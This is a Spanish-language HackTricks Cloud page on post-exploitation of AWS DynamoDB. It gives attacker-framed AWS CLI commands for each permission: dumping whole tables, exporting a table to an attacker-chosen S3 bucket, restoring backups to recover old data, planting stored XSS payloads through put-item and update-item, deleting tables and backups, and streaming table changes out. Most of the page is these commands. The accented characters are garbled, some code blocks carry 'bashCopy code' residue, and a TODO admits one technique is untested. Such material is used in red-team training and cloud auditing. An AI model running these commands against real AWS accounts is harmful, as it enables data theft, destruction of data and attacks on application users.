# AWS - DynamoDB Post Exploitation

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## DynamoDB

Para m치s informaci칩n revisa:

{% content-ref url="../aws-services/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

Un atacante con estos permisos podr치 **obtener elementos de las tablas por la clave primaria** (no puedes simplemente pedir todos los datos de la tabla). Esto significa que necesitas conocer las claves primarias (puedes obtener esto obteniendo los metadatos de la tabla (`describe-table`).

{% tabs %}
{% tab title="json file" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}

**Impacto Potencial:** Privilegios indirectos al localizar informaci칩n sensible en la tabla

### `dynamodb:GetItem`

**Similar a los permisos anteriores** este permite a un atacante potencial leer valores de solo 1 tabla dada la clave primaria de la entrada a recuperar:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

Con este permiso tambi칠n es posible usar el m칠todo **`transact-get-items`** como:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Impacto Potencial:** Privesc indirecto al localizar informaci칩n sensible en la tabla

### `dynamodb:Query`

**Similar a los permisos anteriores** este permite a un atacante potencial leer valores de solo 1 tabla dada la clave primaria de la entrada a recuperar. Permite usar un [subconjunto de comparaciones](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html), pero la 칰nica comparaci칩n permitida con la clave primaria (que debe aparecer) es "EQ", por lo que no se puede usar una comparaci칩n para obtener toda la base de datos en una solicitud.

{% tabs %}
{% tab title="json file" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Impacto Potencial:** Escalada de privilegios indirecta al localizar informaci칩n sensible en la tabla

### `dynamodb:Scan`

Puedes usar este permiso para **volcar toda la tabla f치cilmente**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Impacto Potencial:** Privesc indirecto al localizar informaci칩n sensible en la tabla

### `dynamodb:PartiQLSelect`

Puedes usar este permiso para **volcar toda la tabla f치cilmente**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Esta permiso tambi칠n permite realizar `batch-execute-statement` como:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
pero necesitas especificar la clave primaria con un valor, por lo que no es tan 칰til.

**Impacto Potencial:** Privesc indirecto al localizar informaci칩n sensible en la tabla

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Este permiso permitir치 a un atacante **exportar toda la tabla a un bucket S3** de su elecci칩n:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Nota que para que esto funcione, la tabla necesita tener la recuperaci칩n en un punto en el tiempo habilitada, puedes verificar si la tabla lo tiene con:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Si no est치 habilitado, necesitar치s **habilitarlo** y para eso necesitas el permiso **`dynamodb:ExportTableToPointInTime`**:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Impacto Potencial:** Privesc indirecto al localizar informaci칩n sensible en la tabla

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Con estos permisos, un atacante podr칤a **crear una nueva tabla a partir de una copia de seguridad** (o incluso crear una copia de seguridad para luego restaurarla en una tabla diferente). Luego, con los permisos necesarios, podr칤a revisar **informaci칩n** de las copias de seguridad que **podr칤a no estar m치s en la tabla de producci칩n**.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Impacto Potencial:** Privesc indirecto al localizar informaci칩n sensible en la copia de seguridad de la tabla

### `dynamodb:PutItem`

Este permiso permite a los usuarios agregar un **nuevo 칤tem a la tabla o reemplazar un 칤tem existente** con un nuevo 칤tem. Si un 칤tem con la misma clave primaria ya existe, el **칤tem completo ser치 reemplazado** con el nuevo 칤tem. Si la clave primaria no existe, se **crear치** un nuevo 칤tem con la clave primaria especificada.

{% tabs %}
{% tab title="XSS Example" %}
{% code overflow="wrap" %}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Ejemplo de IA" %}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Impacto Potencial:** Explotaci칩n de vulnerabilidades adicionales/elusiones al poder agregar/modificar datos en una tabla DynamoDB

### `dynamodb:UpdateItem`

Este permiso permite a los usuarios **modificar los atributos existentes de un 칤tem o agregar nuevos atributos a un 칤tem**. No reemplaza el 칤tem completo; solo actualiza los atributos especificados. Si la clave primaria no existe en la tabla, la operaci칩n **crear치 un nuevo 칤tem** con la clave primaria especificada y establecer치 los atributos especificados en la expresi칩n de actualizaci칩n.

{% tabs %}
{% tab title="XSS Example" %}
{% code overflow="wrap" %}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="AI Example" %}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Impacto Potencial:** Explotaci칩n de m치s vulnerabilidades/bypasses al poder agregar/modificar datos en una tabla DynamoDB

### `dynamodb:DeleteTable`

Un atacante con este permiso puede **eliminar una tabla DynamoDB, causando p칠rdida de datos**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Impacto potencial**: P칠rdida de datos y interrupci칩n de servicios que dependen de la tabla eliminada.

### `dynamodb:DeleteBackup`

Un atacante con este permiso puede **eliminar una copia de seguridad de DynamoDB, lo que podr칤a causar p칠rdida de datos en caso de un escenario de recuperaci칩n ante desastres**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Impacto potencial**: P칠rdida de datos e incapacidad de recuperarse de una copia de seguridad durante un escenario de recuperaci칩n ante desastres.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Probar si esto realmente funciona
{% endhint %}

Un atacante con estos permisos puede **habilitar un stream en una tabla de DynamoDB, actualizar la tabla para comenzar a transmitir cambios y luego acceder al stream para monitorear los cambios en la tabla en tiempo real**. Esto permite al atacante monitorear y exfiltrar cambios de datos, lo que potencialmente lleva a una fuga de datos.

1. Habilitar un stream en una tabla de DynamoDB:
```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Describir el stream para obtener el ARN y otros detalles:
```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Obtener el iterador de fragmentos usando el ARN del stream:
```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Usa el iterador de fragmentos para acceder y exfiltrar datos del stream:
```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Impacto potencial**: Monitoreo en tiempo real y fuga de datos de los cambios en la tabla DynamoDB.

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
